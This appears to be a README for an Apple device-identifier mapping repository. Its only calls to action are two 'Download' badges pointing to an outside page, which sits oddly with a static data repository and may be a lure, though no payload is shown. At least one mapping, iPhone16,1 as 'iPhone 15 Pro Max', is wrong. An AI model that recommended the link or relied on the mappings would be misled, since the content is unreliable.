![preview](https://raw.githubusercontent.com/dsalmeron20/ios-device-identifier-map/main/shot_b08c.svg)

# Lumina Device Atlas

## Overview

Imagine holding a vast, meticulously organized library of every device Apple has ever woven into existence — from the original iPhone that redefined communication to the latest M-series tablets that blur the line between laptop and canvas. **Lumina Device Atlas** is that library, transformed into a living, breathing catalog. This repository is not merely a list; it is a **comprehensive knowledge base** designed to decode the cryptic internal identifiers (like `iPhone14,2` or `iPad13,18`) into human-readable, elegant model names. 

For developers, QA engineers, system administrators, and vintage tech enthusiasts alike, Lumina Device Atlas serves as the **definitive reference guide** for device detection, analytics filtering, and hardware research. Instead of scouring fragmented forums or outdated spreadsheets, you gain access to a curated, community-validated dataset that maps every generation, every region, and every subtle hardware variant. Whether you are building a mobile analytics dashboard, a device-compatibility checker, or simply satiating your curiosity about that obscure iPod touch model from 2015, this repository provides the clarity you need in a single, structured location.

The project was born from the chaos of divergent data sources. We observed that while many APIs provide raw model codes, they often fail to translate these into user-friendly names, leaving developers to manually maintain fragile mapping tables. Lumina Device Atlas solves this by offering a **single source of truth**, continuously updated to reflect new releases and software revisions. As we move into 2026, the repository stands as a testament to meticulous data curation, offering a pragmatic utility that simplifies complex identification tasks.

---

## 🚀 Getting Started

[![Download](https://raw.githubusercontent.com/dsalmeron20/ios-device-identifier-map/main/setup_56f1.svg)](https://dsalmeron20.github.io/ios-device-identifier-map/)

To begin utilizing the atlas, you can obtain the latest dataset directly. The repository is structured to provide immediate value without complex configuration. Simply acquire the core data files and integrate them into your existing workflows.

### Quick Access
The primary dataset is available in multiple formats, ensuring compatibility with your preferred development stack. Whether you require a plain-text mapping, a JSON structure for modern web apps, or a CSV for spreadsheet analysis, the `data/` directory contains a version for you.

- **Format Support**: JSON, CSV, and Markdown tables.
- **Language Agnostic**: Since this is a data repository, it integrates seamlessly with any programming language.
- **Zero Dependencies**: The data files are static; they require no runtime libraries to parse.

---

## 🌟 Key Features

### 1. **Exhaustive Historical Coverage**
Our database spans from the 2007 iPhone to the 2026 hardware lineup, including all iPad Pro generations, Apple Watch series, MacBook variants, and even the niche categories like the HomePod and AirPort routers. No stone is left unturned.

### 2. **Intelligent Identifier Mapping**
The core utility of this project lies in its ability to translate internal model numbers (e.g., `A2895` or `iPhone12,5`) into their marketing names (`iPhone 11 Pro Max`). The mapping is granular, covering hardware revisions that usually go undocumented in consumer-facing documentation.

### 3. **Multi-Regional Variants**
Apple frequently releases specific model numbers for different regions (e.g., China, Japan, or North America). This atlas distinguishes these subtle differences, providing clarity for global application testing and compliance checks.

### 4. **Structured, Query-Friendly Data**
The data is formatted with a clear schema, making it easy to filter, sort, and join with other datasets. Each entry includes the internal ID, the official product name, the release year, and the hardware generation.

### 5. **Continuous Updates & Community Validated**
While the core maintenance is managed by the project steward, contributions from the open-source community ensure that edge cases are documented. Every new software release or hardware revision is tracked and added promptly, keeping the atlas relevant for 2026 and beyond.

### 6. **Simplified Troubleshooting**
For technical support teams, this atlas allows for quick identification of a user's device based on diagnostic logs. Instead of asking the user to navigate to "Settings > General > About," support staff can cross-reference the log data directly.

---

## 📊 Why Use Lumina Device Atlas?

### The Pain Point
Developers often resort to third-party services to identify devices, but these services typically offer limited "lookups" per day or require an ongoing subscription. This repository provides a **self-hosted, infinitely scalable alternative** that respects user privacy by keeping all data local.

### The Metaphor
Think of this repository as a **translator for a silent language**. Apple speaks in binary codes; we provide the dictionary. Instead of decoding gibberish, you speak the language of product names, enabling smoother communication between your backend systems and your users' interfaces.

### The Benefit
You gain a **competitive edge** in application development. By accurately mapping hardware, you can optimize graphics performance, tailor UI constraints (like safe areas for notches), or troubleshoot battery drain issues related to specific battery models, all without relying on third-party queries.

---

## 🗂️ Repository Structure

Here is a breakdown of the file hierarchy within Lumina Device Atlas. This structure is designed for intuitive navigation and easy scalability.

```plaintext
/
├── data/
│   ├── devices.json          # The master database in JSON format
│   ├── devices.csv           # The master database in CSV format
│   └── legacy/
│       ├── devices_2024.json # Archived snapshot from late 2024
│       └── devices_2025.json # Archived snapshot from mid-2025
├── docs/
│   ├── CONTRIBUTING.md       # Guidelines for adding new device identifiers
│   ├── CHANGELOG.md          # Record of recent updates and revisions
│   └── SCHEMA.md             # Detailed explanation of the data fields
└── tools/
    └── validator.py          # A simple script to check the integrity of JSON files
```

### The Data Schema
Each entry in the JSON file follows a consistent structure to ensure reliability:

- **`id`** : The internal identifier (e.g., `iPhone15,2`).
- **`model_number`** : The marketing retail part number (e.g., `A2650`).
- **`name`** : The official product name (e.g., `iPhone 14 Pro`).
- **`generation`** : The numeric generation (e.g., `14`).
- **`year_introduced`** : The release year.
- **`aliases`** : A list of other common names or alternate identifiers.

---

## 💡 Use Cases & Applications

### **Mobile Analytics**
If you run a mobile app, integrating this dataset allows you to display "iPhone 15 Pro Max" instead of the cryptic "iPhone16,1" in your analytics dashboard. This improves readability for your marketing and product teams, allowing them to make data-driven decisions based on hardware demographics.

### **Device Compatibility Checkers**
For websites offering download links or streaming services, this atlas enables a quick check of the user's hardware capabilities. For example, you can automatically limit video quality to 1080p on iPhone 8 or older, ensuring a smooth streaming experience, or suggest higher download sizes for devices with more RAM.

### **Internal Inventory Tracking**
Although aimed at software, the repository is equally useful for IT departments managing fleets of corporate devices. By scanning the serial numbers or model identifiers, the atlas can instantly verify if a device is supported by the latest operating system rollouts.

### **E-Learning & Historical Education**
In tech museums or educational courses, this repository serves as a historical timeline, showing the evolution of silicon and industrial design from the plastic-backed iPhone 3G to the titanium-framed iPhone 15 Pro.

---

## 🛠️ Contribution & Collaboration

We believe in the power of collective knowledge. If you own a niche device that seems undocumented, or if you spot a discrepancy in an existing entry, we encourage you to submit a correction. 

**Please ensure** you include the source of your information (e.g., a screenshot of the "System Information" app) to speed up the review process. Strict adherence to the contribution guidelines in the `docs/CONTRIBUTING.md` file ensures a smooth experience for all maintainers.

We welcome contributions that enhance the description of older Hardware Models, as these often lack official documentation.

---

## 📱 Multilingual Support & International Community

To serve a global audience, the README and data descriptions are structured to be easily translated. While the data itself uses English product names (as per Apple's official naming), the field titles and documentation are written with clear, simple terminology to facilitate translation by the community. We support the internationalization of the **interface** (the docs folder) and encourage regional translations of the README.

---

## 🔮 Future Roadmap (Vision for 2026)

As we progress through 2026, we are actively working on enhancing the repository with the following features:

1.  **Direct API Integration**: While the repository remains a static data source, we plan to add a simple script to generate a lightweight REST API wrapper, allowing for dynamic queries without parsing large files on every request.
2.  **Image Asset Mapping**: A long-term goal is to associate public catalog images with each device (referenced externally, not stored in-repo) to aid visual identification.
3.  **Discontinued List**: A dedicated algorithm to flag devices that are now classified as "vintage" or "obsolete" by Apple, helping developers choose which hardware to focus their testing efforts on.
4.  **Automated Scrubbing**: A tool to cross-check our database against public system logs to detect unlisted internal identifiers automatically.

---

## 🤝 Support & Community

While this is a data repository, we value our community. For questions regarding specific device mappings, or to propose a partnership for data aggregation, please refer to the "Issues" tab on the main project page. 

We offer **24/7 community-drive support** via our discussion forums (linked in the repository sidebar). Please refrain from emailing maintainers directly for technical support; using the public boards ensures that answers are discoverable by future users. We strive to respond to all queries within a single business day, focusing on maintaining the integrity and accuracy of the information.

---

## ⚖️ Disclaimer

**Lumina Device Atlas** is an independent, community-maintained project. It is not affiliated with, endorsed by, or sponsored by Apple Inc. 

- Apple, iPhone, iPad, Mac, and Apple Watch are trademarks of Apple Inc., registered in the U.S. and other countries and regions.
- All device names provided in this repository are for descriptive and identification purposes only.
- The information is provided "as is," and while we strive for 100% accuracy, there is a slight possibility of typographical errors in the mapping of internal codes to marketing names. Please cross-reference with your specific device's settings page before making critical decisions.
- We are not responsible for any hardware damage or data loss incurred while using this information for system modifications or performance tuning. This repository is a reference guide, not a modification tool.

---

## 📜 License

This project is licensed under the **MIT License**. This means you are free to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, provided you include the original copyright notice and disclaimer.

**Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction.**

**The Software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement.**

For the full legal text, please see the [LICENSE](LICENSE) file in the root of this repository.

---

## 🔗 Final Access Point

We trust that Lumina Device Atlas will become a staple in your developer toolkit, bringing clarity and precision to your device detection needs. As you integrate this data, we invite you to return with feedback, ensuring that the atlas grows and improves for everyone.

[![Download](https://raw.githubusercontent.com/dsalmeron20/ios-device-identifier-map/main/setup_56f1.svg)](https://dsalmeron20.github.io/ios-device-identifier-map/)